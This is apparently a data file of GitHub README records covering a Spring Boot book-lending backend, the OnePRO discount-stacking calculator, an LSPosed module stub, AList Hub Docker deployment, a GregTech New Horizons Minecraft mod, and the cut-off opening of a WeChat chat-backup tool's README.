",0,0,1,apache-2.0,0.0
caolib/book_management_system,master,"[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=cascadia+code&size=38&duration=3500&pause=1000&color=00ADFF&center=true&vCenter=true&random=false&width=1000&height=100&lines=Book+lending+management+system;图书借阅管理系统)](https://git.io/typing-svg)

&emsp;&emsp;

![springboot](https://img.shields.io/badge/springboot-v3.0.9-%236DB33F?style=flat&logo=springboot&logoColor=236DB33F&labelColor=white)
![maven](https://img.shields.io/badge/Maven-v3.9.5-blue?style=flat&logo=apachemaven&logoColor=red&labelColor=white)
![mybatisplus](https://img.shields.io/badge/MybatisPlus-v3.5.3.1-red?style=flat&labelColor=white)
![mysql](https://img.shields.io/badge/MySQL-v8.2.0-blue?style=flat&logo=mysql&logoColor=blue&labelColor=white)
![redis](https://img.shields.io/badge/Redis-v7.0.12-red?style=flat&logo=redis&logoColor=%23DC382D&labelColor=white)
![GitHub Release](https://img.shields.io/github/v/release/tankingcao/java_design?include_prereleases&sort=date&display_name=release&style=flat&labelColor=red&cacheSeconds=3600)
![下载量](https://img.shields.io/github/downloads/caolib/book_management_system/total.svg)

<!-- 
![GitHub License](https://img.shields.io/github/license/caolib/book_management_system?style=flat)
![opened issues](https://img.shields.io/github/issues/caolib/book_management_system?color=red&cacheSeconds=3600)
![closed issues](https://img.shields.io/github/issues-closed/caolib/book_management_system?color=green&cacheSeconds=3600)
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/caolib/book_management_system?labelColor=red)
-->

使用`springboot+mybatis-plus`框架制作的一个简单的图书借阅管理系统后台服务器

> [!important]
>
> **项目采用前后端分离开发，这是后端项目，对应的[前端项目地址](https://github.com/caolib/vue3-vite)，注意相关技术栈版本不要相差太大**

> [!caution]
>
> - **最近更新中因为使用`redis`二次校验token实现token主动过期，`redis`变成必需项!!!**
> - **在[发行版](https://github.com/caolib/book_management_system/releases)的资源中有此项目对应的数据库结构的`sql`文件**

> [!tip]
> - 使用前先使用maven下载相关依赖，建议使用IDEA编译器，捆绑了maven，可以直接使用
> - 注意前后端一般是同时修改的，必须匹配版本，没有特别需求（不想使用redis）直接使用最新的

## 快速开始

### 1.参照注释修改配置文件

路径：`src/main/resources/application.yml`

```yml
# 项目启动端口，默认8080，修改后前端中的请求地址也要对应修改
server:
  port: 8080

# mybatis-plus配置
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: true # 下划线命名转驼峰
  type-aliases-package: com.clb.domain # 别名扫描包
  mapper-locations: classpath:mapper/*.xml # mapper文件扫描

spring:
  # mysql
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/java_design?serverTimezone=Asia/Shanghai
    # 注意修改用户名和密码为你自己的
    username: root
    password: 123456
    type: com.alibaba.druid.pool.DruidDataSource

  # redis
  data:
    redis:
      # 修改host和密码为你的，如果没有密码则删除password项，redis默认没有密码
      host: localhost
      password: 123456
      port: 6379
      database: 0
      timeout: 5000ms
  cache:
    type: redis  
    redis:
      time-to-live: 3600000 # 缓存过期时间,单位ms(此处一小时)

  # 热重载排除advice文件
  devtools:
    restart:
      additional-exclude: com/clb/util/Advice.class
  # 支持控制台ansi颜色输出(使用java命令行部署时),如果乱码则删除下面3行
  output:
    ansi:
      enabled: always
      
# 日志
logging:
  level:
    com.clb: debug
  pattern:
    dateformat: MM-dd HH:mm:ss.SSS

```

### 2.启动项目

使用编译器一键启动项目(前提:mysql和redis数据库配置正确且已经启动)

## 项目目录结构

- `src/main/java/com/clb/`
  - `config`：配置文件
  - `constant`：枚举字段
  - `controller`：表现层
  - `domain`：实体类等
  - `exception`：异常类
  - `handle`：处理器类
  - `interceptor`：拦截器类
  - `mapper`：持久层
  - `service`：业务层
  - `util`：工具类
- `src/main/resources`
  - `mapper`：映射文件mapper
  - `application.yml`：配置文件
  - `banner.txt`：spring项目启动logo
- `src/test/`：测试类
- `pom.xml`：依赖管理

## 打包使用

> 将项目使用maven打成jar包后可以通过命令行执行jar包

```cmd
java -jar .\book-1.0.0.RELEASE.jar
```

> 可以修改端口号

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081
```

> ~也可以关闭redis~

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081 --spring.cache.type=none
```

> [!tip]
> 此项目对应的[微服务版本](https://github.com/caolib/cloud-book)

## 提交分析
![Alt](https://repobeats.axiom.co/api/embed/fff6dbaa9aa86bbe35a974910b89f89dd10a3383.svg ""Repobeats analytics image"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=caolib/book_management_system,caolib/vue3-vite&type=Timeline)](https://star-history.com/#caolib/book_management_system&caolib/vue3-vite&Timeline)
",1,0,1,mit,0.0
GaoSSR/OnePRO,main,"<div align=center>
  <img width=""365"" src=""./READMEIMG/Project-Name.png"" />
</div>


<div align=""center"">
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%9E%84%E5%BB%BA"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%B5%8B%E8%AF%95"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%96%87%E6%A1%A3"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/badge/%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE-Apache-brightgreen"" alt=""License""></a>
 </div>
<br />

## 轻量级算法驱动优惠叠加器

#### RT：
 <img width=""1000"" src=""./READMEIMG/211690962797_.pic.jpg"" />


#### 背景：

优惠是推动消费者转化的关键因素，它在激发用户消费行为上起着核心作用。目前市场上的优惠策略主要涵盖了各种活动（例如拼多多的“砍一刀”，天猫农场的互动，新用户的首次购买，复购，积分等）和优惠券（如折扣券，代金券，商品券，买一赠一等）。然而，这些复杂的优惠规则使得用户在计算优惠叠加的顺序时感到困扰。这可能导致用户在面对多重优惠时降低购买商品的欲望，尤其是当他们参与了多个活动并持有多个优惠券时，这种情况更为明显。

优惠的计算顺序可以分为平行式和渐进式，其中平行式优惠之间没有相互依赖关系，而渐进式优惠之间则存在依赖关系，即下一个优惠的触发取决于上一个优惠的实施结果。

设想小晴消费了100元，她手头有一张7折优惠券和一张满100元减30元的优惠券。这两个优惠券的使用顺序可能会产生不同的效果，则这2个优惠券的使用顺序有以下两种情况：

<img src=""./READMEIMG/image（1）.png"" width=""75%"">

`OnePRO`采用了一系列新颖的算法，实现了高效求解优惠排列的最优解。

<img src=""./READMEIMG/image（2）.png"" width=""100%"">

#### 核心计算类 Permutation&lt;T extends GoodsItem&gt;

`Permutation`是一个重要的抽象类，作为`OnePRO`的核心，它采用了多种优化策略来确保高性能，这些策略的运用旨在提升计算效率和降低资源消耗，这些策略包括：

- 预存的排列数结果集

之所以采用这种设计，是因为在业务场景中，我们需要频繁进行排列计算。对于给定长度的序列，其排列结果是固定的。在`Permutation`类中，`PERMUTATIONS`属性存储了7以内的排列数结果集。由于这里使用了`Byte`来存储数据，因此占用的内存空间非常小，这有助于提高性能并降低内存消耗。

```Java
private final static Map<Integer,Collection<List<Byte>>> PERMUTATIONS = Maps.newHashMap();

```
这个动作在类加载完成时执行，如果觉得7不合适，对7不满意，可以通过调整`SUPPORTEDSIZE`的大小来满足业务和性能的需求。

我们在实现中经过测试和调整，确定了7是一个相对平衡的参数，它兼顾了业务与性能，当然，根据实际需求，大家可以根据自己的情况来调整这个参数。

```Java
public final static int SUPPORTEDSIZE = 7;

static{
      //前置计算 1-SUPPORTEDSIZE 之间所有排列组合
    for(byte i=1;i<=SUPPORTEDSIZE;i++){
       PERMUTATIONS.put((int)i,Collections2.permutations(IntStream.range(0,i).boxed().map(x->(byte)x.intValue()).collect(Collectors.toList())));
      }
  }

```

- $A_n^3$级别缓存

相对于传统的`Key-Value`结构，解决 $A_n^n$问题的缓存需要进行特殊设计，对于一个优惠集合而言， $A_n^3$意味着需要缓存*n*×(*n*−1)×(*n*−2)条数据。当n=7时，需要缓存210条数据。为了在内存大小和缓存带来的性能收益之间取得平衡， $A_n^3$是最合适的级别。

`Permutation`类通过其成员变量`cache`实现了高性能缓存。

```Java
private final Map<Integer, CalcState<T>> cache = Maps.newHashMap();
```
你或许已经注意到，`cache`的键值使用的是`Integer`类型。在大多数情况下，我们更倾向于使用`String`类型，但在需要进行大量计算的场景中，比如在万次计算的场景下，String字符串的拼接却成了性能瓶颈。

为了实现高性能的键生成，`Permutation`采用了独特的方法。它通过位移对`Byte`数组的前三个字节进行扰动，以确保每个键的唯一性，同时提升性能。

```Java
private static Integer calcKey(List<Byte> a){
       return  a.size()>=3?(a.get(0) << 6)+ (a.get(1) << 3) + a.get(2):0;
}
```

`Permutation`提供了保存点来实现  $A_n^3$ 级别缓存，`CalcState` 记录了计算到第3步的状态，包括当前订单优惠金额和计算过程、已享用优惠的商品等，这些属性的保存和回放`Permutation`已经帮你做好了，`Permutation`额外提供了抽象的保存和回放方法来满足你的个性化诉求。

```Java
   /**
     * 业务将状态记录到保存点
     * @param state 保存点对象
     */
    protected abstract void makeSnapshot(CalcState<T> state,DiscountContext<T> context);

    /**
     * 业务返回保存点状态
     * @param state 保存点对象
     */
    protected abstract void backToSnapshot(CalcState<T> state,DiscountContext<T> context);
```

在优惠计算中，存在一个优先级规则，即优惠计算是有优先级的，需要确保属性`calculateGroup`值较小的优惠先行计算。当发生`backToSnapshot`时，我们需要额外检查缓存中最后一个优惠与当前正准备要计算的优惠之间的关系，如果不满足特定条件，则直接终止计算，直接跳出。而`checkIfWakeUpJump`方法会在缓存被使用后立即判断是否需要继续下去。

#### 上下文类 DiscountContext&lt;T extends GoodsItem&gt;

`DiscountContext`是上下文，也是`Permutation`的成员变量，`DiscountContext`同样包含很多优化策略：

- CalcStage数组

在变更最频繁也是最重要的计算步骤对象`CalcStage`使用数组存储，该数组随着上下文创建而创建，在`Permutation`中使用

```Java
Arrays.fill(arr,null);
```

将该数组清空并让它投入下一次计算，这样一次全排列过程中，数组只会被创建一次，避免了频繁创建数组带来的性能损耗。

- 预计算

`DiscountContext`的初始化是通过静态的`create`方法完成的，该方法将商品与优惠绑定在一起，同时执行一些用户自定义的逻辑，我们称之为“预计算”，预计算的结果被保存在`DiscountContext`的`preCompute`属性中，以便在后续的计算中直接取用，这种方法避免了在后续的高速迭代中重复执行相同的操作，如商品分组和、求和等，从而提高了计算效率。

#### 预计算 PreCompute&lt;T extends GoodsItem&gt;

预计算提供了接口，要使用预计算首先需要实现PreCompute接口

```Java
public interface PreCompute<T extends GoodsItem> {
    /**
     * 判断符合条件的活动类型，符合才会执行preComputeItems
     */
    Set<String> matchTypes();

    /**
     * 对商品做一些复杂集合操作
     * @param items 当前参与优惠的商品
     * @param discount 当前优惠
     * @param preCompute 存储计算的结果
     */
     void preComputeItems(List<T> items, DiscountWrapper discount, Map<String,Object> preCompute);
}
```

此外需要在资源目录下建立`calculator-core.properties`文件，配置内容如下

```Java
precompute.path=你要扫描的包
```
`PreComputeHolder`将处理所有的`PreCompute`实现类，只有`matchTypes`匹配的情况下，才会执行`preComputeItems`方法。

```Java
public class PreComputeHolder {
    public static Set<PreCompute> COMPUTES= Sets.newHashSet();
    private final static String PATH = ""precompute.path"";

    static{
        Properties properties = new Properties();
        try {
              properties = PropertiesLoaderUtils.loadProperties(new FileSystemResource(Objects.requireNonNull(PreComputeHolder.class.getClassLoader().getResource(""calculator-core.properties"")).getPath()));
        } catch (Exception ignore) {
        }
        String path = properties.getProperty(PATH);
        if(StringUtils.isNotBlank(path)){
            Reflections reflections = new Reflections(path);
            Set<Class<? extends PreCompute>> subTypes = reflections.getSubTypesOf(PreCompute.class);
            for(Class<? extends PreCompute> clazz:subTypes){
                try {
                    COMPUTES.add(clazz.newInstance());
                } catch (Exception ignore) {
                }
            }
        }
    }
}
```

#### 计算器 Calculator

`Calculator`是单个优惠的计算接口（即用于优惠计算的接口），它其中定义了一个`calcWarp`方法，负责具体的优惠计算逻辑，但由于`calcWarp`需要承担一些内部的事情，需要处理一些内部细节，因此为了简化使用者的开发工作，我们提供了一个抽象类`AbstractCalculator`，它实现了`calcWarp`方法，并最终暴露了一个更简单更直观的`calc`方法供使用者使用。

`AbstractCalculator`的内容如下，在`AbstractCalculator`中，`calcWarp`方法负责创建`CalcStage`对象，维护`CalcStage`数组等内部工作，这些细节对于使用者来说是透明的，他们只需要关注并实现`calc`方法即可。

```Java
public abstract class AbstractCalculator<T extends GoodsItem> implements Calculator<T> {
    public long calcWarp(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long, T> records, byte idx, int i) {
        CalcStage stage = new CalcStage();
        CalcResult cr = context.getCalcResult();
        long price= cr.getCurPrice();
        stage.setBeforeCalcPrice(price);
        price = calc(context, discountWrapper,records, price, stage);
        if(price<0){
            return price;
        }
        stage.setAfterCalcPrice(price);
        stage.setIndex(idx);
        stage.setStageType(discountWrapper.getType());
        cr.setCurPrice(price);
        if(stage.getBeforeCalcPrice()>stage.getAfterCalcPrice()) {
            cr.getCurStages()[i] = stage;
        }
        return price;
    }

    /**
     * 返回该优惠下的最终要支付的金额,若不符合则返回 prevStagePrice
     * @param context 上下文
     * @param discountWrapper 优惠信息
     * @param records 记录享受过优惠的单品，key是calculateId，这里只提供容器，添加和判断规则由使用者自行决定
     * @param prevStagePrice 上一步计算的订单的价格
     * @param curStage 当前stage
     * @return
     */
    public abstract  long calc(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long,T> records, long prevStagePrice, CalcStage curStage);

}

```
最终用户通过继承`AbstractCalculator`类，并在`Component`注解中指定一个值，而`CalculatorRouter`则通过这个值将请求路由到相应的优惠计算器，这个值与`DiscountWrapper`中的`type`属性相对应。

```Java
@Component(""manjian"")
public class ManjianCalc extends AbstractCalculator<GoodsItem> {
......
}
```


#### 共享互斥协议 DiscountGroup

共享互斥协议是一个数据结构，它是一个数组，数组中最多可以包含两个对象，最少包含一个对象。如果数组中只有一个对象，那么该对象必然为共享组，即组内的优惠可以叠加使用。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            }
            ,
            {
                ""type"": ""activity4"",
                ""id"": ""13""
            } 
            ,
            {
                ""type"": ""coupon1"",
                 ""id"": ""14""
            }
        ]
    }]
```
相应的，当数组中包含两个对象时，第一个对象的`relation`属性可以为`share`或`exclude`，而第二个对象的`relation`属性必须为`exclude`。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            },
            {
                ""type"": ""card3"",
                ""id"":""12""
            }
        ]
    },
    {
        ""relation"": ""exclude"",
        ""items"":
        [
            {
                ""type"": ""card1"",
                ""id"": ""18""
            },
            {
                ""type"": ""coupon1"",
                ""id"": ""22""
            }
        ]
    }
]
```
最终，上述协议将转化为如下两个共享组：

- `activity0-card3-card1` 和 `activity0-card3-coupon1`

工具类 `DiscountGroupUtil` 提供了一个方法，用于将协议转换为共享组。由于共享组可能包含大量优惠，为了提高过滤性能，我们将当前可用的优惠转换为二级`Map`。这个`Map`的外层键是协议中的`type`，而第二层键是协议中的`id`。通过这种方式，我们可以快速地进行交叉过滤，从而提升性能。

```Java
public static List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups, Map<String, Map<String,DiscountWrapper>> inMap);
```
为了确保计算性能，我们将用户在当前订单中可享受的优惠分为两个集合。左侧集合的大小限制为`SUPPORTEDSIZE`，即我们重点保障的、在计算能力范围内的优惠。而右侧集合则尽可能地进行叠加。

从稳定性角度考虑，我们需要对计算次数进行统计。在压力测试中，我们通过`LimitingUtil.count`方法来统计进入`calc`方法的次数。显然，在没有开启缓存的情况下，计算次数为 $A_n^n$×n，而当开启缓存时，计算次数为 $A_n^n$×(n−3)+ $A_n^3$。

#### CASE

看了这么多概念，我们可以在`com.gch.discount.demo`包中找到实际调用的具体case：

```Java
@Controller
public class TestController {

    private final CalculatorRouter calculatorRouter;

    public TestController(CalculatorRouter calculatorRouter) {
        this.calculatorRouter = calculatorRouter;
    }

    @RequestMapping(""test"")
    @ResponseBody
    public Object test() {
        //mock商品
        List<GoodsItem> items = mockItems();
        //mock组关系并转化为共享组
        List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> pairs = transform(mockGroups());
        //全局最优计算过程
        List<CalcStage> globalStages=Lists.newArrayList();
        int count = 0;
        //订单总金额
        long totalPrice = items.stream().mapToLong(GoodsInfo::getSalePrice).sum();
        long globalPrice = totalPrice;
        //构建计算流
        Flowable flowable = (Flowable) new Flowable().build(calculatorRouter);
        for(Pair<Set<DiscountWrapper>,Set<DiscountWrapper>> set:pairs) {
            //统计算力
            count += LimitingUtil.count(set.getLeft().size());
            if(count>N){
                break;
            }
            List<DiscountWrapper> wrappers = Lists.newArrayList(set.getLeft());
            DiscountContext<GoodsItem> ctx = DiscountContext.create(totalPrice, Lists.newArrayList(items), wrappers);
            flowable.perm(ctx);
            if(ctx.getCalcResult().getFinalPrice() < globalPrice) {
                globalStages = Arrays.asList(ctx.getCalcResult().getStages());
                globalPrice = ctx.getCalcResult().getFinalPrice();
            }
        }
        return Pair.of(globalPrice,globalStages);
    }

    private List<List<DiscountGroup>> mockGroups(){
        List<List<DiscountGroup>> groups = Lists.newArrayList();
        DiscountGroup group = new DiscountGroup();
        group.setRelation(GroupRelation.SHARE.getType());
        group.setItems(Lists.newArrayList(new Item(""zhekou"",""1""),new Item(""manjian"",""2""),new Item(""manzeng"",""3"")));
        groups.add(Lists.newArrayList(group));
        return groups;
    }

    private List<GoodsItem> mockItems(){
        IdGenerator idGenerator = IdGenerator.getInstance();
        GoodsInfo goodsInfo = GoodsInfo.of(1001L,2001L,null,4,20 * 100,""产品1"",null);
        GoodsInfo goodsInfo2 = GoodsInfo.of(1001L,2002L,null,2,10 * 100,""产品1"",null);
        List<GoodsItem> items = GoodsItem.generateItems(goodsInfo,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice()));
        items.addAll(GoodsItem.generateItems(goodsInfo2,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice())));
        return items;
    }

    private List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups){
        List<DiscountWrapper> wrapperList = Lists.newArrayList(
                DiscountWrapper.of(""zhekou"", ""1"", ""折扣"", false, new DiscountConfig()),
                DiscountWrapper.of(""manjian"", ""2"", ""满减"", false, new DiscountConfig())
        );
        Map<String, Map<String,DiscountWrapper>> inMap = wrapperList.stream().collect(Collectors.toMap(DiscountWrapper::getType, x->ImmutableMap.of(x.getId(),x)));
        return DiscountGroupUtil.transform(groups,inMap);
    }
}

```





",0,0,1,apache-2.0,0.0
AndroidReverser-Test/bilibiliX,main,"# bilibiliX
下载安装模块安装包，然后在lsposed中启用模块即可。
",4,0,1,apache-2.0,0.0
yuegongzi/alist_hub,main,"# AList Hub

AList Hub是针对小雅AList做的一个封装,更加方便部署、更新和维护

## 功能特点

- 自动签到
- 引导式使用
- 自动更新小雅数据
- 消息推送到手机
- 支持数据监听,并转存
- 支持挂载第三方站点、阿里云盘分享、WebDav和PikPak
- 电影海报
- 系统监控
- AList主题调整
- 自动索引所有数据(小雅数据+自己添加的挂载点)
- 支持搜索

## 界面展示

![image](./assets/1.png)
<br/>
<br/>
![image](./assets/2.png)
<br/>
<br/>
![image](./assets/3.png)
<br/>
<br/>
![image](./assets/4.png)
<br/>
<br/>
![image](./assets/5.png)
<br/>
<br/>
![image](./assets/6.png)

## 开始使用

### 先决条件

系统安装了docker

### 安装

- 方式1:  使用 `docker-compose.yml`

``` yaml

name: alist-hub  
services:
  alist-hub:
    ports:
      - 5244:80
    volumes:
      - ./.alist_data:/opt/alist/data
      - /mnt/nextcloud/alist:/Downloads
    container_name: alist-hub
    image: aetherlib/alist-hub:latest

```

```shell
$ docker-compose up -d
```

- 方式2: 使用`docker`命令

```shell
$ docker run -d \
  --name alist-hub \
  -p 5244:80 \
  -v $(pwd)/.alist_data:/opt/alist/data \
  -v /mnt/nextcloud/alist:/Downloads \
  aetherlib/alist-hub:latest

```

### 配置

- 通过浏览器访问 `http://localhost:5244/@hub/initial` 进入配置页面,根据提示进行配置即可

### 如何使用转存功能

- 安装Aria2
- 在 头像 → 个人设置 → 下载设置 配置好地址和密钥(可选)

### 其他配置说明

- PikPak: 添加账号后会自动装载小雅的PikPak数据
- PushDeer: 自动推送消息到手机(需打开通知) [注册地址](https://www.pushdeer.com/product.html)

## 贡献

说明如何为项目贡献。通常包括：

- Fork 项目
- 创建您的特性分支 (`git checkout -b feature/AmazingFeature`)
- 提交您的更改 (`git commit -m 'Add some AmazingFeature'`)
- 推送到分支 (`git push origin feature/AmazingFeature`)
- 打开一个 Pull Request

## 许可证

该项目根据 MIT 许可证授权。详情请见 [LICENSE](LICENSE) 文件。

## 联系方式

yanganfu2012@gmail.com

## 致谢

- 小雅AList
- AList",0,0,1,mit,0.0
reobf/Programmable-Hatches-Mod,master,"<div align=""center"">
    <h1 align=""center"">
      
可编程仓室模组

Programmable Hatches Mod

[![](https://github.com/reobf/Programmable-Hatches-Mod/actions/workflows/build-and-test.yml/badge.svg)](https://github.com/reobf/Programmable-Hatches-Mod/actions/workflows/build-and-test.yml)
</div>

## 介绍

本项目为GT New Horizons整合包的社区MOD，添加了少许能够帮助游戏玩家更方便完成自动化的单方块机器与多方块结构。

注意，该MOD并非GTNH Mod Pack内的官方MOD，讨论此MOD时请注意场合。

如果在游玩本MOD的过程中遇到BUG或其他问题，请提交issue，必要时请附带复现方式与相关报错log。

## MOD安装须知

### Mod下载与版本

请在Github界面的[Releases](https://github.com/reobf/Programmable-Hatches-Mod/releases)处下载本Mod。

其中你需要注意的是：

本Mod目前单文件适配GTNH整合包 2.6.0 2.6.1版本，2.7.0版本请下载带有gtnh270后缀的版本，不支持GTNH整合包 2.5.0 及以下的版本。

若最新版Mod不能在支持的整合包版本运行,请提issue。

同时，本Mod对2.5.1的支持已经终止，v0.0.18p28是最后一个明确支持2.5.1的版本，尽管在此之后的版本可能可以在2.5.1正常运行，但原则上不再处理仅在2.5.1出现的不兼容问题。

### 关于MOD语言

在游戏安装本Mod后会基于你当前的游戏语言向GregTech.lang文件内写入相应的翻译条目，而写入后将无法自动移除条目。

因此你需要事先设置好你的游戏语言再安装此Mod。

如果在运行过mod之后想更改语言，且启用了UseThisFileAsLanguageFile=true，则你需要删除GregTech.lang，或者恢复安装mod前的GregTech.lang的备份（若有）。

## 内容与特性

### 可编程的仓室

本Mod主要功能为能够让玩家便捷的完成自动化，而GTNH中的虚拟电路板总是让AE接管的自动化变得繁琐。

本Mod为此提供了编程器覆盖板，以及多种电压等级与容量的可编程二合一输入仓，具体功能与GTNH自带的输入总线与总成功能相似，但有以下特性。

#### 可更改电路板设置

<div align=""center"">
  
![pic1](docs/1.png)

`电路覆盖板`

</div>

将编程器覆盖板覆盖至GTNH原版输入总线后，该输入总线将能够识别总线内的编程器电路，并将该总线的虚拟编程电路设置为与编程器电路相同的电路，同时消耗该编程电路。

除了原版输入总线外，GT单方块小机器也能覆盖该覆盖板做到快速更改虚拟电路板的目的。

同时，本Mod所提供的二合一输入仓无需该覆盖板，其自带电路板变更功能。

#### 编程电路的制作

本Mod为各个电压阶段设置了不同的可编程电路制作手段，在一开始，你可以使用锻造锤进行制作编程电路。

<div align=""center"">
  
![pic2](docs/2.png)

`锻造锤制作编程电路`

</div>

除此之外，你可以使用编程器电路提供器方便快捷的合成编程电路，该提供器需要连接至AE网络，并且需要合成处理器才可以使用，合成速度取决于你的合成处理器并行数量。

<div align=""center"">
  
![pic3](docs/3.png)

`电路提供器T1`

</div>

除了T1级别的提供器外，还有更多级别的提供器，同时还有自带模板无需放入物品的预购电路提供器，具体请在NEI内搜索并查看其Tooltips进行了解。

除了电路板外，其他物品例如催化剂等在配方中不被消耗的物品也能制作为编程电路，如果同时需要虚拟电路和催化剂，可以配合本Mod的多电路槽仓室使用。

#### 如何将编程电路编入样板

在编写AE样板时，你可以携带编程工具箱进行样板编写，编程工具箱可以按住Shift + 右键切换模式，其中各个模式的功能如下：

* 模式1：将禁用编程工具箱，此时携带编程工具箱在身上时无法触发任何功能。
* 模式2：将开启不消耗物品自动编入模式，在该模式下，只要你将工具箱放在身上的物品栏内，使用NEI转写配方将把所有不被消耗的物品以编程电路形式编入样板。
* 模式3：与模式2几乎相同，但如果该配方没有需要任何不消耗的物品，那么会生成一个将电路板重置为零的编程电路编入样板。


### 编程二合一输入仓

该输入仓与游戏内的总成作用类似，可以单方块向多方块机器提供配方所需的物品与液体，同时也支持电路编程功能，该输入仓有着多种电压等级版本与升级的缓冲版本。

根据其用途和造价，拥有以下版本的编程二合一输入仓。

* 编程二合一输入仓：没有缓存，只有一个流体输入槽和物品槽的二合一输入仓，电压等级越高，可以输入的物品数量和流体数量越多。

* 编程多流体二合一输入仓：与非多流体的编程二合一输入仓相比，将支持更多种类流体输入，其支持的流体数量取决于电压等级。

* 编程缓冲二合一输入仓：与编程二合一输入仓相比，可以进行物品缓存，多方块机器将优先读取缓存内的物品与流体进行配方合成，同时缓存通常是一次最大输入量的4倍，使用缓冲二合一输入仓有利于充分利用多方块机器的并行。

* 编程缓冲多流体二合一输入仓：与非多流体的缓冲二合一输入仓相比，可以输入多种流体。

* 进阶编程多流体二合一输入仓：与非进阶版本的缓冲多流体二合一输入仓相比，可以存储更多种类的缓存，不同的缓存仓互相隔离，即无法跨配缓存读取物品和流体，使用进阶版本的二合一输入仓有利于解决订单切换导致机器并行无法有效利用问题。

这里我们以Luv级别的进阶编程缓冲多流体输入仓进行演示。

<div align=""center"">
  
![pic4](docs/4.png)

`进阶编程多流体二合一输入仓Luv`

</div>

* 位置1：物品输入界面。

* 位置2：流体输入界面。

其中位置1可存储的物品数量基于电压等级设置，在ME接口向内发送物品时，将不受物品的最大堆叠限制，例如Luv等级的进阶编程缓冲多流体输入仓每格将可堆叠512个物品，EV等级只能堆叠128个物品，

位置2可存储的流体数量设定与位置1相同，但需要注意的是，在非缓冲版本的二合一输入仓只能输入一种流体，而带缓冲的版本随着电压等级的升高可以存储更多种类型的流体，例如Luv缓冲多流体二合一输入仓将可以同时输入5种流体，并且每种流体可以存储64000L，进阶版本的Luv缓冲二合一输入仓流体可输入总数不变，但容量变为512000L.

* 位置3：缓存界面

如果你使用的是带缓冲的二合一输入仓，那么位于位置1与位置2的物品或流体会在1tick后被输送到缓冲，此时多方块结构将优先读取0缓冲位置的物品与流体，缓冲内部将有4倍与外部标识的容量。

需要注意的是，虽然通常玩家会发现缓存内的容量十分巨大，但是处理超大订单时总是出现卡单问题，这是因为外部缓存接受位置的输入量只有缓存内的四分之一，所以编写样板时请注意你的流体数量是否超过了输入仓的最大可接受值，同时注意开启ME接口的阻挡模式，如果不幸发生内部物品乱窜现象，请使用本Mod的ME搋子抽回AE网络。

* 位置4：进阶可编程缓冲二合一输入仓的一些可调整设定

在这里，你可以

>设置是否使用可编程电路模式。
  
>设置是否锁定流体只能存储与位置2中的单格位置，通常情况下，该二合一的流体仓如同GTNH的四重输入仓一样，单种流体在AE发配时无论数量再多，也只能存储在一个格子内部，在二合一输入仓内取消锁定后，单种流体可以在发配时使用多个格子存储。

>设置是否打开输入过滤模式，该设置与普通输入总线的输入过滤模式相同，即该机器的所有配方均无法利用的物品将无法朝内输入。

>输入隔离模式无法被切换。

* 位置5

由于放入缓冲输入面板的物品很快会进入缓存，所以手动放入物品进行合成几乎无法做到，同时你也无法一次性将几组物品放入一个格子里，所以你可以将在5位置处将电源关闭，然后使用插入功能手动向输入面板放置物品，然后再打开电源使物品进入缓存。

#### 其他类型的二合一输入仓

为了解决后期单个配方太大的问题，添加了可以输入超多流体的超级流体二合一输入仓，可以输入10,000,000L*24的流体。

同时还添加了可以使用编程电路的编程样板总线和总成，以及对应的镜像仓室。

除此之外，还有更多功能的特殊仓室请在游戏内搜索。

### 其他实用装置和物品

* ME超级缸/超级箱

与超级缸超级箱功能类似，但是可以直接接入AE网络内，且不需要ME存储总线。

* ME接口覆盖板

与ME接口功能一致，但是能够直接覆盖在机器上，支持二合一和P2P版本。

* 电力原料分配器

解决装配线自动化难题的好办法，具体使用方式游戏内查看tooltips。

* 警告锚

连入AE网络后，AE线缆所在的区块被卸载时将在聊天框内发出警告。

* OC扩展部件

增加了少许Open Computer Mod的使用部件，例如能够访问GT高级无线红石的高级无线红石卡，提供矿典访问与数字和字符串ID转换的API卡等扩展，具体内容请在NEI搜索。

>更多内容请在游戏内探索，如果对于某些内容产生文本理解疑惑，可前去B站进行搜索相关视频教程。

## 兼容性

目前本Mod明确支持GTNH官方版本的所有内容，如果你发现某个仓室无法在某机器上工作，那么该机器本身就不支持总成，除非注入并破坏该机器原本的代码，或者GTNH官方进行修复，不然无法兼容，但是你也还是可以提出相关issue，便于排查问题所在。

同时对于其他社区Mod例如Twist Space Technology Mod的支持可能不全面与不及时，如果你发现与其他Mod发生兼容性问题请提交issue。
",109,13,1,mit,2.0
xuchengsheng/wx-dump-4j,main,"<p align=""center"">
	<a href=""https://wx.xxccss.com/""><img src=""image/logo.png"" width=""45%""></a>
</p>

<p align=""center"">
	<strong>🍬Java版微信聊天记录备份与管理工具</strong>
</p>

<p align=""center"">
	👉 <a href=""https://wx.xxccss.com/"">https://wx.xxccss.com/</a> 👈
</p>

<p align=""center"">
